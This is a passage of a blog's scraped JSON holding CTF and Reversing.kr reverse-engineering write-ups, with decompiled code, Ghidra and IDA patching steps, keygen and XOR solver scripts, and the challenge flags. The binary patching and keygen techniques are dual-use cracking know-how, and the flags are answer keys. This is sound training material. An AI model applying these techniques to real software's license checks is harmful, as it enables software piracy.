2022","uri":"https://duythucne22.github.io/posts/2022/googlectf2022/"},{"content":"HCMUS CTF 2022 - Timehash You can download the zip in my repo: Timehash.zip\nThere will be 1 file in zip:\ntimehash 1. Analyze This is a forensic challenge so we don\u0026rsquo;t need to use checksec, just decompile the file with ghidra to get the flow. First, we will look at main:\nIt will check if argc is equal to 2 or not and will exit if not. Nothing to notice.\nNext, the program will jump into a loop and it will check if local_1c is lower than 0x10000001. If it\u0026rsquo;s false, local_1c then will be change via SeriousHash and keep changing until the check is true. So that\u0026rsquo;s our aim.\nBut after local_1c change, it will sleep(86400), that\u0026rsquo;s a very long time and we maynot get the PIN. The idea is to patch the file to remove that sleep, and also the check of while loop to nop so that local_1c can change until it\u0026rsquo;s lower than 0x10000001 in a short time.\n2. Exploit First, we will debug the binary with gdb to get the address which the sleep function is execute and the check of while is execute:\ngef➤ disas main\rDump of assembler code for function main:\r...\r=\u0026gt; 0x0000000000400728 \u0026lt;+109\u0026gt;:\tcall 0x400530 \u0026lt;sleep@plt\u0026gt;\r0x000000000040072d \u0026lt;+114\u0026gt;:\tmov edi,0x0\r...\r0x000000000040073e \u0026lt;+131\u0026gt;:\tmov QWORD PTR [rbp-0x10],rax\r0x0000000000400742 \u0026lt;+135\u0026gt;:\tmov rax,QWORD PTR [rbp-0x8]\r=\u0026gt; 0x0000000000400746 \u0026lt;+139\u0026gt;:\tadd rax,0x15180\r0x000000000040074c \u0026lt;+145\u0026gt;:\tcmp rax,QWORD PTR [rbp-0x10]\r0x0000000000400750 \u0026lt;+149\u0026gt;:\tjbe 0x40075c \u0026lt;main+161\u0026gt;\r...\rEnd of assembler dump. So we will want to change 2 addresses, which I added the arrow, to nop and save the patched file. Let\u0026rsquo;s open the binary in ghidra and then locate the address 0x0000000000400728. Then click on that address and press Ctrl + Shift + G or click right mouse and click at Patch Instruction. The program will give you a warning but just ignore it.\nAfter you click on the address 0x400728 and press Ctrl + Shift + G, it will change like this:\nNow we just need to type the instruction we want to change. We want to change to nop so just type NOP (remember to uppercase the instruction or ghidra will not recognize that and choose 90, not 66 90):\nAnd after we changed that first address, the next address will be like this:\nSo just keep changing as the same for those 4 bytes. After we\u0026rsquo;ve done that, the instruction will look like this:\nNext, we will change as what we did above with address at 0x0000000000400746:\nAnd we\u0026rsquo;ve change all the instruction needed. The decompiler changed too:\nNo sleep and no add in while. Let\u0026rsquo;s export the file by typing o or press File on the toolbar and select Export Program.... In the popup, we will use format is ELF and the path to save, then press OK to export the patched binary:\nNow, let\u0026rsquo;s debug the patched binary with gdb and set a breakpoint at the comparision of local_1c and our argument:\ngef➤ start 123\r...\rgef➤ disas main\rDump of assembler code for function main:\r...\r0x0000000000400773 \u0026lt;+184\u0026gt;: call 0x400510 \u0026lt;atoi@plt\u0026gt;\r0x0000000000400778 \u0026lt;+189\u0026gt;: cmp eax,DWORD PTR [rbp-0x14]\r0x000000000040077b \u0026lt;+192\u0026gt;: jne 0x400789 \u0026lt;main+206\u0026gt;\r...\rEnd of assembler dump.\rgef➤ b*0x0000000000400778\rBreakpoint 1 at 0x400778\rgef➤ c\r... And the program stop at that comparision. The register eax now containing our input via argument and rbp-0x14 will be local_1c. Let\u0026rsquo;s get that address and we will have the PIN:\nBecause DWORD so we just need to take 4 bytes and that\u0026rsquo;s the PIN we need to find.\n3. Get flag Flag is HCMUS-CTF{96521168}\n","description":"Write up for HCMUS CTF 2022","id":17,"section":"posts","tags":["ctf","reverseing","writeups"],"title":"HCMUS CTF 2022","uri":"https://duythucne22.github.io/posts/2022/hcmusctf2022/"},{"content":"Reversing.kr practice Write-up Easy Crack - 100pts Initial analysis with DiE , we have a PE32 file\nOpen with IDA, at function DialogFunc have sub_401080, use winapi GetDlgItemTextA and MessageBoxA, take value from input to String, comapre then message.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int __cdecl sub_401080(HWND hDlg) { CHAR String[97]; // [esp+4h] [ebp-64h] BYREF __int16 v3; // [esp+65h] [ebp-3h] char v4; // [esp+67h] [ebp-1h] memset(String, 0, sizeof(String)); v3 = 0; v4 = 0; GetDlgItemTextA(hDlg, 1000, String, 100); if ( String[1] != 97 || strncmp(\u0026amp;String[2], Str2, 2u) || strcmp(\u0026amp;String[4], aR3versing) || String[0] != 69 ) return MessageBoxA(hDlg, aIncorrectPassw, Caption, 0x10u); MessageBoxA(hDlg, Text, Caption, 0x40u); return EndDialog(hDlg, 0); } The pass is :Ea5yR3versing\nEasy Keygen - 100pts Trong bài này ta cần phải tìm hiểu cách mà chương trình tạo ra serial từ chính name mà người dùng nhập vào, đó cũng là bản chất của keygen (Key generator)\nIn this chal, we need to analyse how program create serial from name that user input\u0026rsquo;s, that how keygen (Key generator) work.\nOpen program with IDA 32:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 int __cdecl main(int argc, const char **argv, const char **envp) { signed int v3; // ebp int i; // esi char v6; // [esp+Ch] [ebp-130h] char v7[2]; // [esp+Dh] [ebp-12Fh] BYREF char Var[100]; // [esp+10h] [ebp-12Ch] BYREF char Buffer[197]; // [esp+74h] [ebp-C8h] BYREF __int16 v10; // [esp+139h] [ebp-3h] char v11; // [esp+13Bh] [ebp-1h] memset(Var, 0, sizeof(Var)); memset(Buffer, 0, sizeof(Buffer)); v10 = 0; v11 = 0; v6 = 16; qmemcpy(v7, \u0026#34; 0\u0026#34;, sizeof(v7)); print(aInputName); scanf(\u0026#34;%s\u0026#34;, Var); v3 = 0; for ( i = 0; v3 \u0026lt; (int)strlen(Var); ++i ) { if ( i \u0026gt;= 3 ) i = 0; sprintf(Buffer, \u0026#34;%s%02X\u0026#34;, Buffer, Var[v3++] ^ v7[i - 1]); } memset(Var, 0, sizeof(Var)); print(aInputSerial); scanf(\u0026#34;%s\u0026#34;, Var); if ( !strcmp(Var, Buffer) ) print(aCorrect); else print(aWrong); return 0; } Take name from user input then take each char in name xor with v7\n1 sprintf(Buffer, \u0026#34;%s%02X\u0026#34;, Buffer, Var[v3++] ^ v7[i - 1]); Initialise of array v7 in asm\nv7 = [0x10,0x20,0x30]\nSimple reverse of xor.\n1 2 3 4 5 serial = \u0026#34;5B134977135E7D13\u0026#34; b = bytes.fromhex(serial) v7 = [0x10,0x20,0x30] for i in range(8): print(chr(int(b[i])^v7[i%3]),end =\u0026#34;\u0026#34;) #K3yg3nm3 Name: K3yg3nm3\nEasy Unpack - 100pts As the name of the program suggest, it have been Packed, which is a technique in reverse that they usually use to obfuscate or hide the code from normal viewing it.\nThere is a EP(Entry Point) in normal program, which is a Started Point, from then, program will be execute, in this situatian file is being packed, EP has been change.\nDepend on Packer, program will be packed on diffrent data sections, EP will decode data into original. After decoding completed, it start program with EP or also know as (Original-Entry-Point)`.\nSo now, we need to find the OEP of the chal, which is also the answer.\nUsing PE-Editor, find current EP. After decrypt it jump to OEP to execute.\nOEP:00401150\nEasy ELF - 100pts Not recommend using IDA for these challenge since, we can just \u0026lsquo;f5\u0026rsquo; for psuedocode, instaed we shoulde practice ASM :))\nFocus on this section, it check user input:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 _BOOL4 CHECK() { if ( byte_804A021 != 49 ) return 0; input ^= 0x34u; byte_804A022 ^= 0x32u; byte_804A023 ^= 0x88u; if ( byte_804A024 != 88 ) return 0; if ( byte_804A025 ) return 0; if ( byte_804A022 != 124 ) return 0; if ( input == 120 ) return byte_804A023 == -35; return 0; } Continue analyse.\nRename data type and struct to understand easier.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 _BOOL4 CHECK() { if ( input1 != 49 ) return 0; input ^= 0x34u; input2 ^= 0x32u; input3 ^= 0x88u; if ( input4 != 88 ) return 0; if ( input5 ) return 0; if ( input2 != 124 ) return 0; if ( input == 120 ) return input3 == -35; return 0; } Rev time!!\n1 2 3 4 5 6 7 input = [0]*5 input[0] = 120^0x34 input[1] = 49 input[2] = 124^0x32 input[3] = (0xdd)^0x88 input[4] = 88 print(\u0026#34;\u0026#34;.join([chr(c) for c in input])) Password: L1NUX\nReplace - 150pts when debug, click check it got this error.\nTry enter 1 number.\nStill at 40466F,check in data:\nAt line call $+5, set breakpoint and debug:\nTerminate debug, run with input = 4567, dword_4084D0 change base on what input in, specificly input+2 and plus with 601605C7h:\nIncrease by 2 times before being push and call (at inc eax and inc dword_4084D0)\nThat means the error is due to not being able to find the correct offset to call, we need to calculate specifically to get the correct address. Use Strings tab.\nOur addr is 0x00401071\nMessage when blank input is 0x601605CB, but when enter 4567 it becomes 0x601617A2 which is 0x601605CB+ hex(4567)\ninput + 2 + 0x601605C7 + 2 = 0x00401071 input = (0x00401071 - 2 - 2 - 0x601605C7) \u0026amp; 0xffffffff = 2687109798 // \u0026amp; 0xffffffff become positive input = 2687109798\nImagePrc - 120pts Draw and check\nFind check:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) { int SystemMetrics; // eax HWND Window; // eax int v7; // [esp-1Ch] [ebp-64h] struct tagMSG Msg; // [esp+4h] [ebp-44h] BYREF WNDCLASSA WndClass; // [esp+20h] [ebp-28h] BYREF ::hInstance = hInstance; WndClass.cbClsExtra = 0; WndClass.cbWndExtra = 0; WndClass.hbrBackground = (HBRUSH)GetStockObject(0); WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00); WndClass.hInstance = hInstance; WndClass.hIcon = LoadIconA(0, (LPCSTR)0x7F00); WndClass.lpfnWndProc = sub_401130; WndClass.lpszClassName = lpWindowName; WndClass.lpszMenuName = 0; WndClass.style = 3; RegisterClassA(\u0026amp;WndClass); v7 = GetSystemMetrics(1) / 2 - 75; SystemMetrics = GetSystemMetrics(0); Window = CreateWindowExA( 0, lpWindowName, lpWindowName, 0xCA0000u, SystemMetrics / 2 - 100, v7, 200, 150, 0, 0, hInstance, 0); ShowWindow(Window, 5); if ( !GetMessageA(\u0026amp;Msg, 0, 0, 0) ) return Msg.wParam; do { TranslateMessage(\u0026amp;Msg); DispatchMessageA(\u0026amp;Msg); } while ( GetMessageA(\u0026amp;Msg, 0, 0, 0) ); return Msg.wParam; } Check function sub_401130 .\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 case 1u: DC = GetDC(hWnd); hbm = CreateCompatibleBitmap(DC, 200, 150); hdc = CreateCompatibleDC(DC); h = SelectObject(hdc, hbm); Rectangle(hdc, -5, -5, 205, 205); ReleaseDC(hWnd, DC); ::wParam = (WPARAM)CreateFontA(12, 0, 0, 0, 400, 0, 0, 0, 0x81u, 0, 0, 0, 0x12u, pszFaceName); dword_4084E0 = (int)CreateWindowExA( 0, ClassName, WindowName, 0x50000000u, 60, 85, 80, 28, hWnd, (HMENU)0x64, hInstance, 0); SendMessageA((HWND)dword_4084E0, 0x30u, ::wParam, 0); return 0; Function CreateCompatibleBitmap() with image size is 200x150\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 if ( wParam == 100 ) { GetObjectA(hbm, 24, pv); memset(\u0026amp;bmi, 0, 0x28u); bmi.bmiHeader.biHeight = cLines; bmi.bmiHeader.biWidth = v16; bmi.bmiHeader.biSize = 40; bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 24; bmi.bmiHeader.biCompression = 0; GetDIBits(hdc, (HBITMAP)hbm, 0, cLines, 0, \u0026amp;bmi, 0); v8 = operator new(bmi.bmiHeader.biSizeImage); GetDIBits(hdc, (HBITMAP)hbm, 0, cLines, v8, \u0026amp;bmi, 0); ResourceA = FindResourceA(0, (LPCSTR)101, (LPCSTR)0x18); Resource = LoadResource(0, ResourceA); v11 = LockResource(Resource); v12 = 0; v13 = v8; v14 = v11 - (_BYTE *)v8; while ( *v13 == v13[v14] ) { ++v12; ++v13; if ( v12 \u0026gt;= 90000 ) { sub_401500(v8); return 0; } } MessageBoxA(hWnd, Text, Caption, 0x30u); sub_401500(v8); return 0; } Compare each byte with the bitmap, before cmp, the function uses GetDIBits,GetDIBits,FindResourceA,LoadResource.Using ResourceHacker for analyse data sections:\nTo view it, we need file header that matches the bitmap header, we can go online and copy and replace it or create a bitmap file with paint (remember to adjust the resolution to 200x150 before saving):\nAfter save, open with Hxd:\nCopy data from ResourceHacker then save it.\nKey: GOT\nMusic Player - 150pts Readme file:\nThis MP3 Player is limited to 1 minutes. You have to play more than one minute. There are exist several 1-minute-check-routine. After bypassing every check routine, you will see the perfect flag. There is suppose to be Msbox but nothing seem right.\nSince the chal also provide the .dll file so we need to check the imported section.\nThere is WinAPI, double click then use xref (\u0026lsquo;x\u0026rsquo; key) then check what it calls.\nConditon to jmp here:\nif fail jmp to this block Msbox fail\nBefore we have cmp eax, 60000 mean that cmp with 60000ms = 1p, if greater dont jump and go to path FAIL, otherwise reeverse.\nBy this time, i know that we suppose to practice our patching skill, for faster patch, people suggest me using IDA Plugin called keypatch ,with combinations shortcuts Ctrl + Alt + K.change the command jl to jmp:\nThere is also another jump, so we need to modified it too.\ncall ds:__vbaHresultCheckObj\nAs above change it into jmp too.\nRun again it should work.\nCSHOP - 120pts For this chal, we gonna use dnSpy to analyse:\nTheo kinh nghiệm của mình code của bài này đã bị obfuscate, ban đầu mình nghĩ là sẽ unobfuscate trước sau đó phân tích sau, nhưng khi đọc sơ qua thì mình thấy có 1 chổ hơi bất ổn:\nResize the button (0,0):\nClick then get flag.\nPosition - 160pts Learning from the previous post (Musicplayer), this time I check the tab import and string first.\nThere is GetWinDowTextW, xref for reference called it:\nThere are 2 vars to call and save v50 and v51, in which v50 , check [a-z] so I\u0026rsquo;m pretty sure this is the name, the rest is the serial, change it for easier view.\nNow let\u0026rsquo;s checking names:\nSerial only have value 6,7,8 since first char is always +5, next char is +1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 c1 = (name[0] \u0026amp; 1) + 5; c2 = ((name[0] \u0026amp; 0x10) != 0) + 5; c3 = ((name[0] \u0026amp; 2) != 0) + 5; c4 = ((name[0] \u0026amp; 4) != 0) + 5; c5 = ((name[0] \u0026amp; 8) != 0) + 5; c4_ = (name[1] \u0026amp; 1) + 1; c3_ = ((name[1] \u0026amp; 0x10) != 0) + 1; c2_ = ((name[1] \u0026amp; 2) != 0) + 1; c1_ = ((name[1] \u0026amp; 4) != 0) + 1; c5_ = ((name[1] \u0026amp; 8) != 0) + 1; check += ((c1 + c1_)== 7 ); check += ((c5 + c5_)== 6 ); check += ((c3 + c3_)== 8 ); check += ((c4 + c4_)== 7 ); check += ((c2 + c2_)== 6 ); Similar with the 3rd and last chars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 c6 = (name[2] \u0026amp; 1) + 5; c7 = ((name[2] \u0026amp; 0x10) != 0) + 5; c8 = ((name[2] \u0026amp; 2) != 0) + 5; c9 = ((name[2] \u0026amp; 4) != 0) + 5; c10 = ((name[2] \u0026amp; 8) != 0) + 5; c9_ = (name[3] \u0026amp; 1) + 1; c8_ = ((name[3] \u0026amp; 0x10) != 0) + 1; c7_ = ((name[3] \u0026amp; 2) != 0) + 1; c6_ = ((name[3] \u0026amp; 4) != 0) + 1; c10_ = ((name[3] \u0026amp; 8) != 0) + 1; check += ((c6 + c6_)== 7 ); check += ((c10 + c10_)== 7 ); check += ((c8 + c8_)== 7 ); check += ((c9 + c9_)== 7 ); check += ((c7 + c7_)== 6 ); Wrap up:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 bool check(string name){ int c1,c2,c3,c4,c5,c1_,c2_,c3_,c4_,c5_,c6,c7,c8,c9,c10,c6_,c7_,c8_,c9_,c10_; int check = 0; c1 = (name[0] \u0026amp; 1) + 5; c2 = ((name[0] \u0026amp; 0x10) != 0) + 5; c3 = ((name[0] \u0026amp; 2) != 0) + 5; c4 = ((name[0] \u0026amp; 4) != 0) + 5; c5 = ((name[0] \u0026amp; 8) != 0) + 5; c4_ = (name[1] \u0026amp; 1) + 1; c3_ = ((name[1] \u0026amp; 0x10) != 0) + 1; c2_ = ((name[1] \u0026amp; 2) != 0) + 1; c1_ = ((name[1] \u0026amp; 4) != 0) + 1; c5_ = ((name[1] \u0026amp; 8) != 0) + 1; // 5 so dau cua serial check += ((c1 + c1_)== 7 ); check += ((c5 + c5_)== 6 ); check += ((c3 + c3_)== 8 ); check += ((c4 + c4_)== 7 ); check += ((c2 + c2_)== 6 ); c6 = (name[2] \u0026amp; 1) + 5; c7 = ((name[2] \u0026amp; 0x10) != 0) + 5; c8 = ((name[2] \u0026amp; 2) != 0) + 5; c9 = ((name[2] \u0026amp; 4) != 0) + 5; c10 = ((name[2] \u0026amp; 8) != 0) + 5; c9_ = (name[3] \u0026amp; 1) + 1; c8_ = ((name[3] \u0026amp; 0x10) != 0) + 1; c7_ = ((name[3] \u0026amp; 2) != 0) + 1; c6_ = ((name[3] \u0026amp; 4) != 0) + 1; c10_ = ((name[3] \u0026amp; 8) != 0) + 1; //5 so sau cua serial check += ((c6 + c6_)== 7 ); check += ((c10 + c10_)== 7 ); check += ((c8 + c8_)== 7 ); check += ((c9 + c9_)== 7 ); check += ((c7 + c7_)== 6 ); return check ==10; } Bruteforce 3 first chars of pass , 26^3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; bool check(string name){ int c1,c2,c3,c4,c5,c1_,c2_,c3_,c4_,c5_,c6,c7,c8,c9,c10,c6_,c7_,c8_,c9_,c10_; int check = 0; c1 = (name[0] \u0026amp; 1) + 5; c2 = ((name[0] \u0026amp; 0x10) != 0) + 5; c3 = ((name[0] \u0026amp; 2) != 0) + 5; c4 = ((name[0] \u0026amp; 4) != 0) + 5; c5 = ((name[0] \u0026amp; 8) != 0) + 5; c4_ = (name[1] \u0026amp; 1) + 1; c3_ = ((name[1] \u0026amp; 0x10) != 0) + 1; c2_ = ((name[1] \u0026amp; 2) != 0) + 1; c1_ = ((name[1] \u0026amp; 4) != 0) + 1; c5_ = ((name[1] \u0026amp; 8) != 0) + 1; // 5 so dau cua serial check += ((c1 + c1_)== 7 ); check += ((c5 + c5_)== 6 ); check += ((c3 + c3_)== 8 ); check += ((c4 + c4_)== 7 ); check += ((c2 + c2_)== 6 ); c6 = (name[2] \u0026amp; 1) + 5; c7 = ((name[2] \u0026amp; 0x10) != 0) + 5; c8 = ((name[2] \u0026amp; 2) != 0) + 5; c9 = ((name[2] \u0026amp; 4) != 0) + 5; c10 = ((name[2] \u0026amp; 8) != 0) + 5; c9_ = (name[3] \u0026amp; 1) + 1; c8_ = ((name[3] \u0026amp; 0x10) != 0) + 1; c7_ = ((name[3] \u0026amp; 2) != 0) + 1; c6_ = ((name[3] \u0026amp; 4) != 0) + 1; c10_ = ((name[3] \u0026amp; 8) != 0) + 1; //5 so sau cua serial check += ((c6 + c6_)== 7 ); check += ((c10 + c10_)== 7 ); check += ((c8 + c8_)== 7 ); check += ((c9 + c9_)== 7 ); check += ((c7 + c7_)== 6 ); return check ==10; } void brutePass(string name,int length,string set){ if (name.size()==length) return; for (auto c:set){ string temp = name+ c; if (check(temp) \u0026amp;\u0026amp; temp[3]==\u0026#39;p\u0026#39;){ cout\u0026lt;\u0026lt;temp\u0026lt;\u0026lt;endl; break; } brutePass(temp,length,set); } } int main(){ string set = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;; brutePass(\u0026#34;\u0026#34;,4,set); return 0; } Choose fisrt:\nDirect3D FPS - 140pts Traced it and saw that the sub_4039C0 called:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int *sub_4039C0() { int *result; // eax result = \u0026amp;dword_409194; while ( *result != 1 ) { result += 132; if ( (int)result \u0026gt;= (int)\u0026amp;unk_40F8B4 ) { MessageBoxA(hWnd, aCkfkbulileEZf, \u0026#34;Game Clear!\u0026#34;, 0x40u); return (int *)SendMessageA(hWnd, 2u, 0, 0); } } return result; } The msg Game Clear there is also this string attached\nUsing xref, it was getting xored, this must be decrypted\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int __thiscall sub_403400(void *this) { int result; // eax int v2; // edx result = sub_403440(this); if ( result != -1 ) { v2 = dword_409190[132 * result]; if ( v2 \u0026gt; 0 ) { dword_409190[132 * result] = v2 - 2; } else { dword_409194[132 * result] = 0; data[result] ^= byte_409184[528 * result]; } } return result; } I change teh data name ,it take each char then xor with byte_409184, check byte_409184+528 what do we have here.\nUsing the python in IDA and got the following result: (0x002D9184 is the location of byte_409184)\nPython\u0026gt;b = 0x002D9184 Python\u0026gt;get_bytes(b,1) b\u0026#39;\\x00\u0026#39; Python\u0026gt;get_bytes(b+518,1) b\u0026#39;S\u0026#39; Python\u0026gt;b = 0x002D9184 Python\u0026gt;get_bytes(b,1) b\u0026#39;\\x00\u0026#39; Python\u0026gt;get_bytes(b+528,1) b\u0026#39;\\x04\u0026#39; Python\u0026gt;get_bytes(b+528*2,1) b\u0026#39;\\x08\u0026#39; byte_409184 gonna e an arrayfrom 0,4,8,12,16\u0026hellip;then xor with the available data.\nI wrote this script to get data and byte_409184 then xor them together:\n1 2 3 4 5 data = 0x0407028 #data start address j =0 for i in range(50): print(chr(int.from_bytes(get_bytes(data+i,1),\u0026#34;big\u0026#34;)^j),end = \u0026#34;\u0026#34;) j+=4 Use IDA\u0026rsquo;s load script to run the py file:\nMultiplicative - 170pts We have a jar file\nUse jadx to decompile:\nThis problem uses multiplication before calculation, so pretty sure this is overflow.\nType long has 64 bits so the largest number will be 2^63-1, the next number will be -2^63, so we will calculate a reasonable value for it to return to\n-1536092243306511225\nConvert -1536092243306511225 to unsigned number, we get 0xeaaeb43e477b8487\n(0xeaaeb43e477b8487 + 2^64.n) will be a multiple of 26729, script:\n1 2 3 4 5 6 7 8 from ctypes import * i = 0 while True: if ((2**64)*i + 0xeaaeb43e477b8487)%26729==0: print((2**64)*i + 0xeaaeb43e477b8487) break i+=1 print(c_int64(253087792599051741660295//26729)) Flag:\n-8978084842198767761\nransomware - 120pts By the name, the file must have been encrypted, so it cannot run:\nTest with random input, there is a change in the content of file:\nFile has been packed\nUse CFF Explorer to unpack it:\nThe program used fopen to open a file named file, mode is rb, which means reading bytes from the given file\nAfter calling the file read command, the program will loop to get each byte of the file and then save it to byte_5415B8:\nNext section jump loc_44A8A5\nThrough the debugging, I found that [ebp+var_8] will count from 0 to [ebp+var_10] (len of file), if smaller, then continue the loop, temporarily called i and n.\nThere are 3 instructions xor, the first xor is to clear edx, there is also div for [ebp+var_C] (length of the key from user), which div will use eax divided by the source operand register, then the remainder stored in edx\nmovsx edx, byte_44D370[edx] byte_44D370 is the user entered key,\nThen our bytes file is still xor with 0xFF, our encryption will be:\n1 byte[i] = byte[i]^key[i%len(key)]^0xFF We dont know the key and len(key) so i try bruteforce but not work.\nWe xor the og file with 0xFF first:\n1 2 3 4 b = bytearray(open(\u0026#39;file\u0026#39;, \u0026#39;rb\u0026#39;).read()) for i in range(len(b)): b[i] = b[i]^0xFF open(\u0026#39;file_new\u0026#39;, \u0026#39;wb\u0026#39;).write(b) Open file_new with HxD:\nA readable text that repeats many times, this is definitely the key, try entering it into the file run.exe:\nKey seem right, but how can we run it now:\nUsing DiE, I see this is a 32bits executable file and packed, unpacked and put into ida to try:v\nFlag: Colle System\nHateIntel - 150pts Run on macOS, however compiled with gcc:\nmacOS use the architecture ARM (arm architecture) instead of intel_x86,_x64 other chals, ARM usually writing all the commands in UPPERCASE. Function main():\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int sub_2224() { char __s[80]; // [sp+4h] [bp-5Ch] BYREF int v2; // [sp+54h] [bp-Ch] int v3; // [sp+58h] [bp-8h] int i; // [sp+5Ch] [bp-4h] v2 = 4; printf(\u0026#34;Input key : \u0026#34;); scanf(\u0026#34;%s\u0026#34;, __s); v3 = strlen(__s); sub_232C(__s, v2); for ( i = 0; i \u0026lt; v3; ++i ) { if ( __s[i] != byte_3004[i] ) { puts(\u0026#34;Wrong Key! \u0026#34;); return 0; } } puts(\u0026#34;Correct Key! \u0026#34;); return 0; } The program takes the user\u0026rsquo;s input , then call sub_232C (maybe encryption method) ,then compares it with the byteavailable data in the program:\nCheck the method encrypt:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 signed __int32 __fastcall encrypt(signed __int32 result, int a2) { char *__s; // [sp+4h] [bp-10h] int i; // [sp+8h] [bp-Ch] signed __int32 j; // [sp+Ch] [bp-8h] __s = (char *)result; for ( i = 0; i \u0026lt; a2; ++i ) { for ( j = 0; ; ++j ) { result = strlen(__s); if ( result \u0026lt;= j ) break; __s[j] = sub_2494((unsigned __int8)__s[j], 1); } } return result; } Iterates through the string 4 times (a2 = 4), each time each character will be encrypt with the method sub_2494:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __fastcall sub_2494(unsigned __int8 a1, int a2) { int v3; // [sp+8h] [bp-8h] int i; // [sp+Ch] [bp-4h] v3 = a1; for ( i = 0; i \u0026lt; a2; ++i ) { v3 *= 2; if ( (v3 \u0026amp; 0x100) != 0 ) v3 |= 1u; } return (unsigned __int8)v3; } Method sub_2494 also has a loop, but a2 = 1, so we consider it as not having a loop, we focus on the logic, at v3 |= 1u; so this function will handle bit operations:\n1 2 3 4 5 int rotate(char c){ c \u0026lt;\u0026lt;=1; if ( (c \u0026amp; 0x100) != 0 ) c |= 1u; return (unsigned __int8)c; // lấy 8 bits cuối } Shift 8 bits of the character to the left, take the first bit and add it to the end, or in other words rotate bits, when rotating 4 times, the first 4 bits become the last 4 bits and vice versa:\n1 2 3 4 5 6 b = [0x44, 0xF6, 0xF5, 0x57, 0xF5, 0xC6, 0x96, 0xB6, 0x56,0xF5, 0x14, 0x25, 0xD4, 0xF5, 0x96, 0xE6, 0x37, 0x47,0x27, 0x57, 0x36, 0x47, 0x96, 3, 0xE6, 0xF3, 0xA3,0x92] for byte in b: last = byte\u0026gt;\u0026gt;4 first = byte\u0026amp;0xF s = (first\u0026lt;\u0026lt;4) | last print(chr(s),end = \u0026#34;\u0026#34;) #Do_u_like_ARM_instructi0n?:) Flag: Do_u_like_ARM_instructi0n?:)\nx64 Lotto - 140pts Analyse with IDA:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 __int64 wmain() { unsigned int v0; // eax __int64 i; // rbx char v2; // r8 int v3; // edx __int64 k; // rcx _BYTE *v5; // rdx __int64 j; // rcx char v7; // al int v8; // ecx __int16 *v9; // rdx __int16 v10; // ax __int16 v11; // ax int n1; // [rsp+40h] [rbp-78h] BYREF int n2; // [rsp+44h] [rbp-74h] BYREF int n3; // [rsp+48h] [rbp-70h] BYREF int n4; // [rsp+4Ch] [rbp-6Ch] BYREF int n5; // [rsp+50h] [rbp-68h] BYREF int n6; // [rsp+54h] [rbp-64h] BYREF int v19[3]; // [rsp+58h] [rbp-60h] int v20; // [rsp+64h] [rbp-54h] int v21; // [rsp+68h] [rbp-50h] int v22; // [rsp+6Ch] [rbp-4Ch] __int16 v23[25]; // [rsp+70h] [rbp-48h] BYREF __int16 v24; // [rsp+A2h] [rbp-16h] n1 = 0; n2 = 0; n3 = 0; n4 = 0; n5 = 0; n6 = 0; v19[0] = 0; v19[1] = 0; v19[2] = 0; v20 = 0; v21 = 0; v22 = 0; v0 = time64(0i64); srand(v0); do { wprintf(L\u0026#34;\\n\\t\\tL O T T O\\t\\t\\n\\n\u0026#34;); wprintf(L\u0026#34;Input the number: \u0026#34;); wscanf_s(L\u0026#34;%d %d %d %d %d %d\u0026#34;, \u0026amp;n1, \u0026amp;n2, \u0026amp;n3, \u0026amp;n4, \u0026amp;n5, \u0026amp;n6); wsystem(L\u0026#34;cls\u0026#34;); Sleep(500u); for ( i = 0i64; i \u0026lt; 6; v19[i - 1] = rand() % 100 ) ++i; v2 = 1; v3 = 0; k = 0i64; byte_7FF658B935F0 = 1; while ( v19[k] == *(\u0026amp;n1 + k * 4) ) { ++k; ++v3; if ( k \u0026gt;= 6 ) goto LABEL_9; } v2 = 0; byte_7FF658B935F0 = 0; LABEL_9: ; } while ( v3 != 6 ); v5 = byte; v23[1] = 92; v23[0] = 184; v23[2] = 139; v23[5] = 184; v23[3] = 107; j = 0i64; v23[4] = 66; v23[6] = 56; v23[7] = 237; v23[8] = 219; v23[9] = 91; v23[10] = 129; v23[11] = 41; v23[12] = 160; v23[13] = 126; v23[14] = 80; v23[15] = 140; v23[16] = 27; v23[17] = 134; v23[18] = 245; v23[19] = 2; v23[20] = 85; v23[21] = 33; v23[22] = 12; v23[23] = 14; v23[24] = 242; v24 = 0; do { v7 = byte[j - 1]; j += 5i64; *(\u0026amp;v20 + j + 1) ^= (v7 - 12); *(\u0026amp;v21 + j) ^= (byte[j - 5] - 